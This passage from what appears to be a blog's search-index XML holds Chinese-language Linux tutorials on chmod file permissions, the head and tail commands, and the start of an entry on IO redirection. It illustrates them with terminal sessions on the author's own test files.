屏幕捕获+OCR识别+翻译,python,截屏,ocr</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> utilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chmod（File Permissions）</title>
      <link href="/blog/2020/07/13/linux/tools/chmod/"/>
      <url>/blog/2020/07/13/linux/tools/chmod/</url>
      
        <content type="html"><![CDATA[<h2 id="linux-file-permissions">Linux File Permissions</h2><p>类 unix 系统上的所有文件系统对象都有三种主要的权限类型:read、write 和execute 权限。这些权限被赋予给三类用户：the user(the file owner), thegroup, and the others.</p><p>要查看文件权限，可以使用 <code>ls</code> 的<code>-l</code> (longformat) 选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l</span></span><br><span class="line">total 12K</span><br><span class="line">-rw-r--r-- 2 violetv violetv  426  6月 14 16:40 batch.py</span><br><span class="line">-rw-r--r-- 2 violetv violetv  426  6月 14 16:40 hard_link_batch.py</span><br><span class="line">lrwxrwxrwx 1 violetv violetv    8  6月 29 10:02 soft_link_batch.py -&gt; batch.py</span><br><span class="line">drwxr-xr-x 2 violetv violetv 4.0K  6月 13 14:37 test1</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 12 linuxize users 12.0K Apr  8 20:51 filename.txt</span><br><span class="line">|[-][-][-]-   [------] [---]</span><br><span class="line">| |  |  | |      |       |</span><br><span class="line">| |  |  | |      |       +-----------&gt; 7. Group</span><br><span class="line">| |  |  | |      +-------------------&gt; 6. Owner</span><br><span class="line">| |  |  | +--------------------------&gt; 5. Alternate Access Method</span><br><span class="line">| |  |  +----------------------------&gt; 4. Others Permissions</span><br><span class="line">| |  +-------------------------------&gt; 3. Group Permissions</span><br><span class="line">| +----------------------------------&gt; 2. Owner Permissions</span><br><span class="line">+------------------------------------&gt; 1. File Type</span><br></pre></td></tr></table></figure><p>我们主要研究每一行的第一部分，第一部分有 9 个字符，按照 1，3，3，3分别四个部分，其含义如下：</p><table><thead><tr class="header"><th style="text-align: left;">File type</th><th style="text-align: left;">User</th><th style="text-align: left;">Group</th><th style="text-align: left;">Others</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><code>d</code> Directory</td><td style="text-align: left;"><code>rwx</code></td><td style="text-align: left;"><code>r-x</code></td><td style="text-align: left;"><code>r-x</code></td></tr><tr class="even"><td style="text-align: left;"><code>-</code> Regular file</td><td style="text-align: left;"><code>rw-</code></td><td style="text-align: left;"><code>r--</code></td><td style="text-align: left;"><code>r--</code></td></tr><tr class="odd"><td style="text-align: left;"><code>l</code> Symbolic Link</td><td style="text-align: left;"><code>rwx</code></td><td style="text-align: left;"><code>rwx</code></td><td style="text-align: left;"><code>rwx</code></td></tr></tbody></table><ol type="1"><li><p>第一个字母代表文件类型，有三种类型分别为：<code>d</code>目录、<code>-</code> 常规文件、<code>l</code>符号链接（软链接）</p></li><li><p>余下九个字母，分三组分别为 user(Owner)，group，others的权限。</p><ol type="1"><li><p><code>r</code>: <strong>R</strong>ead</p><ul><li>文件是否可读</li><li>目录内容可看</li></ul><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [12:49:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll |grep batch.py</span></span><br><span class="line">---------- 2 violetv violetv  426  6月 14 16:40 batch.py</span><br><span class="line">---------- 2 violetv violetv  426  6月 14 16:40 hard_link_batch.py</span><br><span class="line">lrwxrwxrwx 1 violetv violetv    8  6月 29 10:02 soft_link_batch.py -&gt; batch.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [12:49:20]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> batch.py</span></span><br><span class="line">cat: batch.py: Permission denied</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [12:49:20]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [12:49:20]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll|grep <span class="built_in">test</span></span></span><br><span class="line">drwxr-xr-x  2 violetv violetv 4.0K  6月  9 17:00 py_tests</span><br><span class="line">d-wx--x--x  3 violetv violetv 4.0K  6月 29 12:44 test</span><br><span class="line">drwxr-xr-x  4 violetv violetv 4.0K  6月 26 12:45 testsh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [12:50:06]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll <span class="built_in">test</span></span></span><br><span class="line">ls: cannot open directory &#x27;test&#x27;: Permission denied</span><br></pre></td></tr></table></figure></p></li><li><p><code>w</code>: <strong>W</strong>rite</p><ul><li>文件内容是否可以被修改</li><li>目录里的内容是否可以被修改（创建新文件，删除文件，重命名文件）注意：目录的写权限不影响文件自身的写权限，文件如果自身有写权限，那么文件内的内容可以修改，即：目录权限和文件权限，即：本身的读写执行无关。</li></ul><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># violetv at manjaro in ~/test [13:37:41]</span></span><br><span class="line">$ ll ../ |grep test</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>月  <span class="number">9</span> <span class="number">17</span>:<span class="number">00</span> py_tests</span><br><span class="line">dr-xr-xr-x  <span class="number">3</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>月 <span class="number">29</span> <span class="number">12</span>:<span class="number">44</span> test</span><br><span class="line">drwxr-xr-x  <span class="number">4</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>月 <span class="number">26</span> <span class="number">12</span>:<span class="number">45</span> testsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># violetv at manjaro in ~/test [13:37:53]</span></span><br><span class="line">$ rm batch.py</span><br><span class="line">rm: remove write-protected regular file <span class="string">&#x27;batch.py&#x27;</span>? y</span><br><span class="line">rm: cannot remove <span class="string">&#x27;batch.py&#x27;</span>: Permission denied</span><br><span class="line"></span><br><span class="line"><span class="comment"># violetv at manjaro in ~/test [13:38:06]</span></span><br><span class="line">$ mv batch.py batch_temp.py</span><br><span class="line">mv: cannot move <span class="string">&#x27;batch.py&#x27;</span> to <span class="string">&#x27;batch_temp.py&#x27;</span>: Permission denied</span><br></pre></td></tr></table></figure></p></li><li><p><code>x</code>: e<strong>X</strong>ecu 对应位置（r 或 w 或x）的权限</p><ul><li>文件是否可执行（是否具有可执行权限）</li><li>目录是否可以 <code>cd</code> 进入</li></ul><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># violetv at manjaro in ~ [13:43:36]</span></span><br><span class="line">$ ll| grep test</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>月  <span class="number">9</span> <span class="number">17</span>:<span class="number">00</span> py_tests</span><br><span class="line">dr--r--r--  <span class="number">3</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>月 <span class="number">29</span> <span class="number">12</span>:<span class="number">44</span> test</span><br><span class="line">drwxr-xr-x  <span class="number">4</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>月 <span class="number">26</span> <span class="number">12</span>:<span class="number">45</span> testsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># violetv at manjaro in ~ [13:43:43]</span></span><br><span class="line">$ cd test</span><br><span class="line">cd: permission denied: test</span><br></pre></td></tr></table></figure></p></li></ol><ul><li><code>-</code>: 代表没有该权限</li></ul></li></ol><blockquote><p>Note that access to files targeted by symbolic links is controlled bythe permissions of the targeted file, not the permissions of the linkobject</p></blockquote><h2 id="chmod-使用"><code>chmod</code> 使用</h2><p><code>chmod [OPTIONS] MODE FILE...</code></p><p><code>chmod</code> (change mode) 命令允许你使用 3种方式改变文件的权限：</p><ol type="1"><li>Symbolic Method</li><li>Numeric Method</li><li>Reference Method</li></ol><p>该命令可以接受一个或多个文件或目录（以空格分隔）作为参数</p><h2 id="symbolic-text-method">Symbolic (Text) Method</h2><p>当使用符号方法时，命令的格式大致为这样</p><p><code>chmod [OPTIONS] [ugoa…][-+=]perms…,[…] FILE...</code></p><p>第一个 flag（users flags）： <code>[ugoa…]</code>定义要改变哪个用户类关于本文件的权限。 如果不指定此 flag， 默认为全部users，也就相当于指定 flag <code>a</code>。</p><ul><li><code>u</code>： The <strong>u</strong>ser(the file owner).</li><li><code>g</code>： The members of the <strong>g</strong>roup.</li><li><code>o</code>： All <strong>o</strong>ther users.</li><li><code>a</code>： <strong>A</strong>ll users, identical to ugo.</li></ul><blockquote><p>If the users flag is omitted, the default one is a and thepermissions that are set by umask are not affected.</p></blockquote><p>第二个 flag（the operation flags）： <code>[-+=]</code>定义哪些权限要被增加删除或者设置</p><ul><li><code>-</code>： Removes the specified permissions.</li><li><code>+</code>： Adds specified permissions.</li><li><code>=</code>： Changes the current permissions to the specifiedpermissions. If no permissions are specified after the <code>=</code>symbol, all permissions from the specified user class are removed.</li></ul><p>权限(perms...) 可以被明确地设定为 0 或者 <code>r,w,x</code>中的一个或几个。此外，当你想要从一个用户类拷贝权限到另一个用户类时，也可以使用<code>u,g,o</code>中的一个字符。</p><p>当设置为多个用户类别设置权限的时候，使用逗号（注意逗号前后不要空格，否则会报错）</p><p>例子：</p><p><code>chmod a-x filename</code>、<code>chmod og-rwx filename</code>、<code>chmod og= filename</code>、<code>chmod u=rwx,g=r,o= filename</code>、<code>chmod g+u filename</code></p><h2 id="numeric-method">Numeric Method</h2><p>Octal Notation for File Permissions(文件权限的八进制表示法)</p><p>格式：<code>chmod [OPTIONS] NUMBER FILE...</code></p><table><colgroup><col style="width: 11%" /><col style="width: 6%" /><col style="width: 6%" /><col style="width: 75%" /></colgroup><thead><tr class="header"><th>column0</th><th>column1</th><th>column2</th><th>column3</th></tr></thead><tbody><tr class="odd"><td>权限</td><td>权限数值</td><td>二进制</td><td>具体作用</td></tr><tr class="even"><td>r</td><td>4</td><td>00000100</td><td><strong>r</strong>ead，读取。当前用户可以读取文件内容，当前用户可以浏览目录。</td></tr><tr class="odd"><td>w</td><td>2</td><td>00000010</td><td><strong>w</strong>rite，写入。当前用户可以新增或修改文件内容，当前用户可以删除、移动目录或目录内文件。</td></tr><tr class="even"><td>x</td><td>1</td><td>00000001</td><td>e<strong>x</strong>ecute，执行。当前用户可以执行文件，当前用户可以进入目录。</td></tr><tr class="odd"><td>no permission</td><td>0</td><td>00000000</td><td>无权限</td></tr></tbody></table><p>例如：<code>chmod 754 filename</code></p><p>依照上面的表格，权限组合就是对应权限值求和，如下：</p><p>7 = 4 + 2 + 1 读写运行权限 5 = 4 + 1 读和运行权限 4 = 4 只读权限</p><p>即：将 filename文件的读写运行权限赋予文件所有者，把读和运行的权限赋予群组用户，把读的权限赋予其他用户。</p><h2 id="using-a-reference-file">Using a Reference File</h2><p>格式： <code>chmod --reference=REF_FILE FILE</code></p><p>The <code>--reference=ref_file</code> option允许你参照指定文件设置相同的权限。</p><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:54:48]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 754 batch.py</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:55:13]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 12K</span><br><span class="line">-rwxrwxrwx 1 violetv violetv    0  6月 29 14:24 1.py</span><br><span class="line">-rwxr-xr-- 2 violetv violetv  431  6月 29 13:45 batch.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:55:14]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> --reference=batch.py 1.py</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:55:26]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 12K</span><br><span class="line">-rwxr-xr-- 1 violetv violetv    0  6月 29 14:24 1.py</span><br><span class="line">-rwxr-xr-- 2 violetv violetv  431  6月 29 13:45 batch.py</span><br></pre></td></tr></table></figure><h2 id="recursively-change-the-files-permissions">Recursively Change theFile’s Permissions</h2><p>对给定目录下的所有文件和目录进行递归操作，使用<code>-R</code>（<code>--recursive</code>） 参数</p><p>格式：<code>chmod -R MODE DIRECTORY</code></p><h2 id="operating-on-symbolic-links">Operating on Symbolic Links</h2><p>符号链接（软链接）的权限总是为777。当你要改变符号链接（软链接）的权限，实际上改变的是链接指向的文件的权限。</p><p>示例：batch.py 及其软链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:57:54]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 12K</span><br><span class="line">-rwxr-xr-- 1 violetv violetv    0  6月 29 14:24 1.py</span><br><span class="line">-rwxr-xr-- 2 violetv violetv  431  6月 29 13:45 batch.py</span><br><span class="line">-rwxr-xr-- 2 violetv violetv  431  6月 29 13:45 hard_link_batch.py</span><br><span class="line">lrwxrwxrwx 1 violetv violetv    8  6月 29 10:02 soft_link_batch.py -&gt; batch.py</span><br><span class="line">drwxr-xr-x 2 violetv violetv 4.0K  6月 13 14:37 test1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:57:55]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 777 soft_link_batch.py</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:59:53]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 12K</span><br><span class="line">-rwxr-xr-- 1 violetv violetv    0  6月 29 14:24 1.py</span><br><span class="line">-rwxrwxrwx 2 violetv violetv  431  6月 29 13:45 batch.py</span><br><span class="line">-rwxrwxrwx 2 violetv violetv  431  6月 29 13:45 hard_link_batch.py</span><br><span class="line">lrwxrwxrwx 1 violetv violetv    8  6月 29 10:02 soft_link_batch.py -&gt; batch.py</span><br><span class="line">drwxr-xr-x 2 violetv violetv 4.0K  6月 13 14:37 test1</span><br></pre></td></tr></table></figure><h2 id="changing-file-permissions-in-bulk">Changing File Permissions inBulk</h2><ol type="1"><li><p>对某一个文件夹下所有的文件夹都赋予执行权限: 例如：对<code>~/foldername/</code>文件都赋予执行权限：<code>chmod +x ~/foldername/*</code></p></li><li><p>使用 <code>find</code> 命令，例如：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/my_website -type d -exec chmod 755 &#123;&#125; \;</span><br><span class="line">find /var/www/my_website -type f -exec chmod 644 &#123;&#125; \;</span><br><span class="line">find /var/www/my_website -type d -exec chmod u=rwx,go=rx &#123;&#125; \;</span><br><span class="line">find /var/www/my_website -type f -exec chmod u=rw,go=r &#123;&#125; \;</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="参考资料">参考资料</h2><p><a href="https://linuxize.com/post/chmod-command-in-linux/">ChmodCommand in Linux (File Permissions)</a></p><p><ahref="https://www.linode.com/docs/tools-reference/tools/modify-file-permissions-with-chmod/">ModifyFile Permissions with chmod</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chmod </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>head 和 tail 命令</title>
      <link href="/blog/2020/07/13/linux/tools/head_tail/"/>
      <url>/blog/2020/07/13/linux/tools/head_tail/</url>
      
        <content type="html"><![CDATA[<h2 id="tail">tail</h2><h3 id="introduction">introduction</h3><p>tail 命令显示一个或多个文件或管道数据的最后一部分(<strong>默认为 10行</strong>)。它还可以用来实时监控文件的变化。</p><p>tail命令最常见的用途之一是监视和分析随时间变化的<strong>日志</strong>和其他文件，通常与grep 等其他工具结合使用。</p><p>head 和 tail 用法一致，只不过是显示头部前几行。</p><h3 id="preparation">Preparation</h3><p>提前在 <code>ipython</code> 里面用 python 搞个测试文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.log&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        fp.write(<span class="string">f&quot;正数第<span class="subst">&#123;i&#125;</span> 行， 倒数第<span class="subst">&#123;<span class="number">51</span>-i&#125;</span> 行\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后下面如果可以显示行数少的，我就将测试结果放上来，行数多的，就不放了。</p><h3 id="usage">Usage</h3><p><code>tail [OPTION]... [FILE]...</code></p><p><code>OPTION</code>: 后面介绍常用的几个 <code>FILE</code>：零个或多个文件名。如果没有指定文件，或者当 <code>FILE</code> 为<code>-</code> 时，tail 将读取标准输入。</p><ol type="1"><li><p>最简单的用法是不加 <code>OPTION</code>， 默认显示文件的最后 10 行<code>tail filename.txt</code></p></li><li><p>最常见的用法是 <code>-f</code> OPTION，循环读取，实时显示文件的改变<code>tail -f filename.txt</code>。</p></li><li><p>显示尾部的指定行数，使用 <code>-n</code> (<code>--lines</code>)参数 <code>tail -n &lt;NUMBER&gt; filename.txt</code></p><p>例如：显示最后 2 行：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -n 2 test.log</span></span><br><span class="line">正数第49 行， 倒数第2 行</span><br><span class="line">正数第50 行， 倒数第1 行</span><br></pre></td></tr></table></figure></p><p>注意： <code>-n</code> 的 <code>n</code> 可以去掉，直接<code>-&lt;NUMBER&gt;</code>,例如：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -2 test.log</span></span><br><span class="line">正数第49 行， 倒数第2 行</span><br><span class="line">正数第50 行， 倒数第1 行</span><br></pre></td></tr></table></figure></p></li><li><p>显示尾部的指定字节数， 使用 <code>-c</code>(<code>--bytes</code>) 参数</p><p><code>tail -c &lt;NUMBER&gt; filename.txt</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -c 15 test.log</span></span><br><span class="line">倒数第1 行</span><br></pre></td></tr></table></figure></p><p>此外，还可以指定倍数，例如：<code>b</code> 是 512， <code>K</code> 是<code>1024</code>，不过目前来看，我没有发现指定字节这个参数的用处，因此，不详细学这里了，否则早晚要忘记。</p></li><li><p>监控文件变化，使用 <code>-f</code> (<code>--follow</code>) 参数<code>tail -f filename.txt</code>， 此参数在检测日志文件时，尤其有用。例如：实时动态显示 <code>/var/log/nginx/error.log</code> 的后 10 行。<code>tail -f /var/log/nginx/error.log</code></p><p>为了在文件被删除后重新创建时，持续监控文件，使用 <code>-F</code>参数：</p><p>我测试时，先用 <code>tail -F test.log</code>，然后在另一个 shell中，<code>rm test.log</code>，然后再用 python 写入，就是下面结果。</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -F test.log</span></span><br><span class="line">正数第41 行， 倒数第10 行</span><br><span class="line">正数第42 行， 倒数第9 行</span><br><span class="line">正数第43 行， 倒数第8 行</span><br><span class="line">正数第44 行， 倒数第7 行</span><br><span class="line">正数第45 行， 倒数第6 行</span><br><span class="line">正数第46 行， 倒数第5 行</span><br><span class="line">正数第47 行， 倒数第4 行</span><br><span class="line">正数第48 行， 倒数第3 行</span><br><span class="line">正数第49 行， 倒数第2 行</span><br><span class="line">正数第50 行， 倒数第1 行</span><br><span class="line">tail: &#x27;test.log&#x27; has become inaccessible: No such file or directory</span><br><span class="line">tail: &#x27;test.log&#x27; has appeared;  following new file</span><br><span class="line">正数第1 行， 倒数第50 行</span><br><span class="line">正数第2 行， 倒数第49 行</span><br><span class="line">正数第3 行， 倒数第48 行</span><br><span class="line">正数第4 行， 倒数第47 行</span><br><span class="line">正数第5 行， 倒数第46 行</span><br><span class="line">正数第6 行， 倒数第45 行</span><br></pre></td></tr></table></figure></p><p>至于为什么后面是从 <code>正数第1 行</code>开始显示，是因为 Python逐行写入，然后 tail 在写入一行后，就读取导致的。 你可以使用 Heredocument， 就可以看到正常的结果了。</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt;- <span class="string">EOF &gt; test.log</span></span></span><br><span class="line">正数第41 行， 倒数第10 行</span><br><span class="line">正数第42 行， 倒数第9 行</span><br><span class="line">正数第43 行， 倒数第8 行</span><br><span class="line">正数第44 行， 倒数第7 行</span><br><span class="line">正数第45 行， 倒数第6 行</span><br><span class="line">正数第46 行， 倒数第5 行</span><br><span class="line">正数第47 行， 倒数第4 行</span><br><span class="line">正数第48 行， 倒数第3 行</span><br><span class="line">正数第49 行， 倒数第2 行</span><br><span class="line">正数第50 行， 倒数第1 行</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p></li><li><p>显示多个文件， 空格分隔即可。 为 <code>tail</code>给予多个文件输入参数，它会展示每个文件夹的最后 10 行。<code>tail filename1.txt filename2.txt</code> 例如：<code>tail filename1.txt filename2.txt</code></p><p>此外，你也可以使用和显示一个文件时，可用的相同参数。</p></li><li><p>tail 与其他命令搭配</p><ol type="1"><li>与 grep 使用 监控 apache 的访问日志文件，只显示那些包含ip：192.168.42.12 的。<code>tail -f /var/log/apache2/access.log | grep 192.168.42.12</code></li><li>与 ps 使用，查看 top n 的占用某一资源的进程<code>ps aux | sort -nk +3 | tail -5</code> 显示 top 5 占用 CPU资源的进程。</li></ol></li><li><p>head 与其他命令使用 head命令可以与其他命令结合使用，通过管道将标准输出重定向到其他程序。例子：对环境变量 <code>$RANDOM</code> 取 sha512 摘要，然后输出前 24个字符。<code>echo $RANDOM | sha512sum | head -c 24 ; echo</code></p></li></ol><h2 id="参考资料">参考资料</h2><p><a href="https://linuxize.com/post/linux-tail-command/">Linux TailCommand</a></p><p><a href="https://linuxize.com/post/linux-head-command/">Linux HeadCommand</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> head </tag>
            
            <tag> tail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux IO 重定向，文件描述符</title>
      <link href="/blog/2020/07/13/linux/tools/ioredirect_fd/"/>
      <url>/blog/2020/07/13/linux/tools/ioredirect_fd/</url>
      
        <content type="html"><![CDATA[<h2 id="输入重定向">输入重定向</h2><h3 id="管道">管道</h3><p>通过 <code>echo</code> 命令和管道传递</p><p>不要以为由管道串起的两个命令会依次执行。Linux系统实际上会<strong>同时运行</strong>这两个命令，在系统内部将它们连接起来。<strong>在第一个命令产生输出的同时，输出会被立即送给第二个命令</strong>。数据传输不会用到任何中间文件或缓冲区。</p><p><code>tee</code> 复制 pipe 文件流</p><p>命令作用：在管道中间复制一份标准输入，然后接着传递管道的标准输入（并不改变标准输入）。</p><blockquote><p>In computing, tee is a command in command-line interpreters (shells)using standard streams which reads standard input and writes it to bothstandard output and one or more files, effectively duplicating itsinput.It is primarily used in conjunction with pipes and filters. Thecommand is named after the T-splitter used in plumbing.</p></blockquote><p><code>tee filename</code>将标准输入的内容<strong>覆盖</strong>到文件一份<code>tee -a filename</code>将标准输入的内容<strong>追加</strong>到文件一份</p><h2 id="直接通过文件重定向">直接通过文件重定向</h2><p><code>python input_need.py &lt; input_content.txt</code></p><h2 id="输出重定向">输出重定向</h2><h2 id="命令替换">命令替换</h2><p>shell脚本中最有用的特性之一就是可以从命令输出中提取信息，并将其赋给变量。把输出赋给变量之后，就可以随意在脚本中使用了。这个特性在处理脚本数据时尤为方便。</p><p>命令替换和重定向有些相似，但区别在于命令替换是将一个命令的输出作为另外一个命令的参数。</p><p>将命令输出赋给变量的两种方法：</p><ol type="1"><li>反引号 (`)</li><li><code>$()</code> 格式</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 `command2`</span><br></pre></td></tr></table></figure><h3 id="示例">示例</h3><ol type="1"><li><p>当你想统计某个目录下所有（或者一部分）文件的字数时，下面为统计当前目录下<code>test</code> 相关文件的字数：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">wc</span> `<span class="built_in">ls</span> |grep <span 